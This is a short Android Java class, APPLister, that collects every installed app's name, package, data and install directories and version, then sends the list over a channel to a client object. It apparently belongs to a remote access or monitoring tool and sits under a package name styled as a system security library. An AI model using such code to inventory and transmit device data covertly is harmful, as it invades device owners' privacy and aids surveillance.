package com.android.security.library;

import java.util.List;

import com.android.security.ClientListener;
import com.android.security.packages.APPListPacket;
import com.android.security.utils.MyAPP;

 
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.util.Log;
 

public class APPLister {
	private int channel;
	private ClientListener client;

	public APPLister(int chan, ClientListener client) {
		channel = chan;
		this.client = client;
	}

	public void getAllApps() {
		APPListPacket appListPacket = new APPListPacket();
		PackageManager pManager = client.getApplicationContext()
				.getPackageManager();
		List<PackageInfo> paklist = pManager.getInstalledPackages(0);
		for (int i = 0; i < paklist.size(); i++) {
			
			
			
			MyAPP myapp = new MyAPP();
			PackageInfo pak = (PackageInfo) paklist.get(i);
			myapp.setSystemAPP(((pak.applicationInfo.flags & ApplicationInfo.FLAG_SYSTEM) > 0));
			myapp.setAppName(pak.applicationInfo.loadLabel(pManager).toString());
			myapp.setPackageName(pak.packageName);
			myapp.setDataDir(pak.applicationInfo.dataDir);
			myapp.setInstalledDir(pak.applicationInfo.sourceDir);
			myapp.setVersionCode(pak.versionCode);
			myapp.setVersionName(pak.versionName);
			appListPacket.add(myapp);
			
			Log.i("APPLister",pak.packageName);
		}
		
		client.sendData(channel, appListPacket.build());
	}
}
